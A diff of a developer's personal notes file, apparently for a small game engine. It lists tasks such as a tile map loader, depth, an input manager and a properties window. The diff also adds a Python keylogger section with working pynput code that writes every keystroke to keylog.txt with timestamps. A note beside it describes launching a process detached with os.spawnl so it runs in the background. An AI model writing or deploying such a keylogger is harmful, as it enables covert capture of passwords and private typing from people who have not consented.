@@ -1,9 +1,48 @@
-1. create atlas by joining all texture
+1. create atlas by joining all texture -> not needed
 4. create a tile map loader
 6. Implement depth
-7. make 2 descriptorset layout 1 for sampler and other for uniform buffer
 9. basic input manager
 10. create sqllite integeration
-
-
 --------------------------
+
+Properties Window
+1. show the object properties like 
+name
+current texture
+texture flip
+position
+scale
+physics properties??
+
+
+
+
+#pyhton kyelogger
+
+install pyinput with pip
+create script for loggin
+3
+4
+5
+6
+7
+8
+9
+10
+	
+from pynput.keyboard import Key, Listener
+import logging
+ 
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+ 
+def on_press(key):
+    logging.info(str(key))
+ 
+with Listener(on_press=on_press) as listener :
+    listener.join()
+
+fire using subprocess
+import os
+os.spawnl(os.P_DETACH, 'some_long_running_command')
+
+
